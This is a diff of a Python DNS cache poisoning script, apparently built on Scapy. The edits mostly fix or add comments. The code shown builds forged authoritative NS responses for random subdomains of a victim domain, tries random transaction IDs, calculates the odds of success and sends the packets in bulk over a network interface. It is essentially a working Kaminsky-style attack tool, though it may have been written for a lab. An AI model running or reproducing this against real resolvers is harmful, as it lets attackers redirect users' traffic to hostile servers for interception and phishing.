@@ -35,16 +35,16 @@ def forged_ns_response(id, target_domain, known_ns_ip):
         id=id,  # Query ID / transaction id
         qr=1,  # Response
         opcode=0,  # QUERY
-        aa=1,  # No authoritative answers, as we are not sending any answers
+        aa=1,  # Authoritative answers, as we are sending a response
         tc=0,  # Not truncated
-        rd=1,  # No recursion desired
-        ra=1,  # Recursion is not available, please ask attacker dns
+        rd=1,  # Mirror request flag
+        ra=1,  # Recursion available
         z=0,  # Reserved and must be zero
         rcode=0,  # Response code for "ok"
         qdcount=1,  # Question record count
-        nscount=1,  # authority count
-        arcount=1,  # additional record count
-        ancount=1,
+        nscount=1,  # Authority count
+        arcount=1,  # Additional record count
+        ancount=1,  # Answer count
         # AD and CD bits are defined in RFC 2535
         ad=0,  # Authentic Data
         cd=0,  # Checking Disabled
@@ -73,8 +73,10 @@ class Poison(Thread):
             random_domain = "www{}{}.{}".format(counter, self.offset, victim_base_domain)
             counter += 1
 
-            #
+            # Start with a request for a random domain
             packet_list = [Ether() / a_request(random_domain)]
+
+            # Append x forged NS responses
             for id in random.sample(range(2 ** 16), self.response_amount):
                 packet_list.append(forged_ns_response(id, random_domain, self.known_ns_ip))
 
@@ -82,7 +84,7 @@ class Poison(Thread):
             print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}"
                   .format(self.response_amount, counter, 1 - pow((1 - self.response_amount / 65536.), counter)))
 
-            # Spam forged responses
+            # Spam packets
             sendpfast(packet_list, iface="eth1", verbose=False)
 
             # Check if we guessed the TXID right
